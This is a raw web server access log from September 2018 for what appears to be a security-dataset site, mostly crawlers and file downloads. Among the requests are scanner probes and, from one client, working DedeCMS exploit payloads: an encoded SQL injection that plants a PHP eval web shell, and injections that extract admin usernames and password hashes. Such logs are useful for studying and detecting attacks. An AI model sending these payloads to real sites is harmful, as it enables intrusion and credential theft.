185.6.245.156 - - [27/Sep/2018:03:40:17 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
185.6.245.156 - - [27/Sep/2018:03:40:17 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
100.43.90.103 - - [27/Sep/2018:03:41:15 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
187.87.218.206 - - [27/Sep/2018:03:41:41 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
187.87.218.206 - - [27/Sep/2018:03:41:41 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
185.6.245.156 - - [27/Sep/2018:03:40:26 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 528070963 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
216.244.66.245 - - [27/Sep/2018:03:43:38 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
91.123.227.160 - - [27/Sep/2018:03:46:01 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.ie/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
91.123.227.160 - - [27/Sep/2018:03:46:18 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
91.123.227.160 - - [27/Sep/2018:03:46:18 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
91.123.227.160 - - [27/Sep/2018:03:46:19 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
59.68.43.159 - - [27/Sep/2018:03:20:37 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 551041635 "http://www.secrepo.com/maccdc2012/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
216.244.66.245 - - [27/Sep/2018:03:48:28 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/dhcp.html HTTP/1.1" 200 4498 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
93.136.127.212 - - [27/Sep/2018:03:48:37 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
93.136.127.212 - - [27/Sep/2018:03:48:37 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
113.171.224.176 - - [27/Sep/2018:03:49:20 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
216.244.66.245 - - [27/Sep/2018:03:57:32 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=S;O=A HTTP/1.1" 200 1798 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
157.55.39.135 - - [27/Sep/2018:03:58:08 -0700] "GET /self.logs/error.log.2017-03-23.gz HTTP/1.1" 200 837 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.84 - - [27/Sep/2018:04:00:35 -0700] "GET /self.logs/error.log.2017-10-18.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
39.111.208.132 - - [27/Sep/2018:04:01:26 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
150.249.214.251 - - [27/Sep/2018:04:01:26 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
185.6.245.156 - - [27/Sep/2018:04:10:47 -0700] "GET /maccdc2012/ssl.log.gz HTTP/1.1" 200 1313675 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
162.210.196.130 - - [27/Sep/2018:04:11:30 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
185.6.245.156 - - [27/Sep/2018:04:11:30 -0700] "GET /maccdc2012/ssh.log.gz HTTP/1.1" 200 182517 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
162.210.196.130 - - [27/Sep/2018:04:11:34 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
185.6.245.156 - - [27/Sep/2018:04:12:25 -0700] "GET /squid/access.log.gz HTTP/1.1" 200 23177322 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
91.98.45.55 - - [27/Sep/2018:04:12:47 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
91.98.45.55 - - [27/Sep/2018:04:12:48 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
91.98.45.55 - - [27/Sep/2018:04:12:48 -0700] "GET /GitHub-Mark.png HTTP/1.1" 304 166 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
91.98.45.55 - - [27/Sep/2018:04:12:50 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
91.98.45.55 - - [27/Sep/2018:04:13:48 -0700] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 45019 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
47.254.215.143 - - [27/Sep/2018:04:14:05 -0700] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 301 498 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
47.254.215.143 - - [27/Sep/2018:04:14:05 -0700] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 239 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
47.254.215.143 - - [27/Sep/2018:04:14:09 -0700] "GET /scripts/setup.php HTTP/1.1" 301 476 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
47.254.215.143 - - [27/Sep/2018:04:14:10 -0700] "GET /scripts/setup.php HTTP/1.1" 404 239 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
47.254.215.143 - - [27/Sep/2018:04:14:11 -0700] "GET /pma/scripts/setup.php HTTP/1.1" 301 484 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
47.254.215.143 - - [27/Sep/2018:04:14:12 -0700] "GET /pma/scripts/setup.php HTTP/1.1" 404 239 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
47.254.215.143 - - [27/Sep/2018:04:14:12 -0700] "GET /xmlrpc.php HTTP/1.1" 301 462 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
47.254.215.143 - - [27/Sep/2018:04:14:13 -0700] "GET /xmlrpc.php HTTP/1.1" 404 239 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
207.46.13.243 - - [27/Sep/2018:04:14:50 -0700] "GET /self.logs/2015/access.log.2015-01-26.gz HTTP/1.1" 200 3257 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.243 - - [27/Sep/2018:04:14:50 -0700] "GET /self.logs/2015/access.log.2015-01-28.gz HTTP/1.1" 200 2128 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.243 - - [27/Sep/2018:04:14:50 -0700] "GET /self.logs/2015/access.log.2015-01-21.gz HTTP/1.1" 200 4026 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.243 - - [27/Sep/2018:04:14:50 -0700] "GET /self.logs/?C=S;O=D HTTP/1.1" 200 13934 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.135 - - [27/Sep/2018:04:14:54 -0700] "GET /self.logs/2015/access.log.2015-01-27.gz HTTP/1.1" 200 2252 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.135 - - [27/Sep/2018:04:14:54 -0700] "GET /self.logs/2015/access.log.2015-01-29.gz HTTP/1.1" 200 8410 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.135 - - [27/Sep/2018:04:14:54 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 1020187 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.135 - - [27/Sep/2018:04:14:55 -0700] "GET /self.logs/?C=D;O=D HTTP/1.1" 200 12342 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.135 - - [27/Sep/2018:04:14:55 -0700] "GET /self.logs/2015/?C=S;O=D HTTP/1.1" 200 8252 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.135 - - [27/Sep/2018:04:14:55 -0700] "GET /misc/zeus_dga_domains.txt.zip HTTP/1.1" 200 594359 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.84 - - [27/Sep/2018:04:15:11 -0700] "GET /data HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.60 - - [27/Sep/2018:04:15:11 -0700] "GET /self.logs/2016/ HTTP/1.1" 200 7741 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.60 - - [27/Sep/2018:04:15:11 -0700] "GET /self.logs/2015/?C=N;O=A HTTP/1.1" 200 7436 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.60 - - [27/Sep/2018:04:15:11 -0700] "GET /self.logs/2015/access.log.2015-01-22.gz HTTP/1.1" 200 2799 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.60 - - [27/Sep/2018:04:15:11 -0700] "GET /self.logs/?C=M;O=D HTTP/1.1" 200 12930 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.60 - - [27/Sep/2018:04:15:11 -0700] "GET /self.logs/ HTTP/1.1" 200 12343 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.60 - - [27/Sep/2018:04:15:12 -0700] "GET /self.logs/2015/access.log.2015-01-25.gz HTTP/1.1" 200 3060 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.84 - - [27/Sep/2018:04:15:12 -0700] "GET /self.logs/2015/?C=M;O=D HTTP/1.1" 200 7665 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.84 - - [27/Sep/2018:04:15:12 -0700] "GET /self.logs/2015/access.log.2015-01-23.gz HTTP/1.1" 200 2158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.84 - - [27/Sep/2018:04:15:12 -0700] "GET /self.logs/?C=N;O=A HTTP/1.1" 200 12343 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.84 - - [27/Sep/2018:04:15:13 -0700] "GET /self.logs/2015/access.log.2015-01-24.gz HTTP/1.1" 200 2276 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
223.73.231.119 - - [27/Sep/2018:04:21:15 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
66.102.6.62 - - [27/Sep/2018:04:25:19 -0700] "GET /maccdc2012/ HTTP/1.1" 200 765 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.6.62 - - [27/Sep/2018:04:25:19 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
18.221.232.130 - - [27/Sep/2018:04:25:53 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/42.0" 
216.244.66.245 - - [27/Sep/2018:04:26:18 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
175.140.189.53 - - [27/Sep/2018:04:27:16 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
175.140.189.53 - - [27/Sep/2018:04:27:16 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
45.114.192.2 - - [27/Sep/2018:04:29:56 -0700] "GET / HTTP/1.1" 200 12383 "http://www.google.com/search?hl=en-IN&source=hp&biw=&bih=&q=secrepo&btnG=Google+Search&gbv=2" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.18) Gecko/20110628 Ubuntu/10.04 (lucid) Firefox/3.6.18" 
45.114.192.2 - - [27/Sep/2018:04:29:57 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.18) Gecko/20110628 Ubuntu/10.04 (lucid) Firefox/3.6.18" 
45.114.192.2 - - [27/Sep/2018:04:29:57 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.18) Gecko/20110628 Ubuntu/10.04 (lucid) Firefox/3.6.18" 
45.114.192.2 - - [27/Sep/2018:04:29:57 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.18) Gecko/20110628 Ubuntu/10.04 (lucid) Firefox/3.6.18" 
157.55.39.84 - - [27/Sep/2018:04:30:10 -0700] "GET /data HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.244.66.245 - - [27/Sep/2018:04:30:58 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/loaded_scripts.html HTTP/1.1" 200 3289 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
46.118.119.215 - - [27/Sep/2018:04:36:52 -0700] "GET / HTTP/1.1" 200 46156 "https://serdechnic.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
46.118.119.215 - - [27/Sep/2018:04:36:52 -0700] "GET / HTTP/1.1" 200 46156 "https://serdechnic.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
185.6.245.156 - - [27/Sep/2018:04:37:20 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 549098528 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
157.55.39.84 - - [27/Sep/2018:04:40:47 -0700] "GET /self.logs/error.log.2017-03-08.gz HTTP/1.1" 304 188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.62 - - [27/Sep/2018:04:49:12 -0700] "GET /self.logs/error.log.2017-09-06.gz HTTP/1.1" 301 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.173 - - [27/Sep/2018:04:51:30 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
41.223.160.173 - - [27/Sep/2018:04:52:56 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
210.35.92.98 - - [27/Sep/2018:04:57:04 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
119.74.222.130 - - [27/Sep/2018:04:57:06 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
119.74.222.130 - - [27/Sep/2018:04:57:06 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
119.74.222.130 - - [27/Sep/2018:04:57:07 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
119.74.222.130 - - [27/Sep/2018:04:57:07 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
119.74.222.130 - - [27/Sep/2018:04:57:08 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
118.113.147.54 - - [27/Sep/2018:04:44:25 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 551041635 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
162.210.196.97 - - [27/Sep/2018:05:00:36 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.97 - - [27/Sep/2018:05:00:36 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.97 - - [27/Sep/2018:05:00:38 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.97 - - [27/Sep/2018:05:00:39 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
111.125.115.135 - - [27/Sep/2018:05:02:01 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
111.125.115.135 - - [27/Sep/2018:05:02:02 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
120.92.20.178 - - [27/Sep/2018:05:08:05 -0700] "GET / HTTP/1.1" 200 46156 "-" "PycURL/7.43.0.2 libcurl/7.60.0 OpenSSL/1.1.0h zlib/1.2.11 c-ares/1.14.0 WinIDN libssh2/1.8.0 nghttp2/1.32.0" 
120.92.20.178 - - [27/Sep/2018:05:08:06 -0700] "GET /data/%236Ik1Qv.asa HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:06 -0700] "GET /data/%23data.asp HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:07 -0700] "GET /data/%23aspcms252.asp HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:07 -0700] "GET /data/%235Dp8Gh.asp HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:08 -0700] "POST /include/dialog/select_soft_post.php HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:08 -0700] "GET /plus/fhksof.php HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:09 -0700] "GET /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 HTTP/1.1" 418 584 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
120.92.20.178 - - [27/Sep/2018:05:08:09 -0700] "GET /plus/ad_js.php?aid=19 HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
120.92.20.178 - - [27/Sep/2018:05:08:10 -0700] "GET /plus/read.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
120.92.20.178 - - [27/Sep/2018:05:08:10 -0700] "GET /user.php?act=login HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:11 -0700] "GET /plus/recommend.php?&aid=1&_FILES[type][tmp_name]=%5C%27%20%20or%20mid=@%60%5C%27%60%20/*!50000union*//*!50000select*/1,2,3,%28select%20%20CONCAT%280x7c,userid,0x7c,pwd,0x7c%29+from+%60%23@__admin%60%20limit+0,1%29,5,6,7,8,9%23@%60%5C%27%60+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111 HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:11 -0700] "GET /plus/search.php?keyword=as&typeArr[111%3D@%60%5C%27%60)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+%60%23@__admin%60+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@%60%5C%27%60+]=a HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:12 -0700] "GET /phpmyadmin/ HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:12 -0700] "GET /ueditor/net/controller.ashx HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:13 -0700] "GET /ueditor/controller.ashx HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:13 -0700] "POST /index.php?m=vod-search HTTP/1.1" 404 340 "-" "python-requests/2.19.1" 
120.92.20.178 - - [27/Sep/2018:05:08:14 -0700] "GET /forum.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
120.92.20.178 - - [27/Sep/2018:05:08:15 -0700] "GET /bbs/forum.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
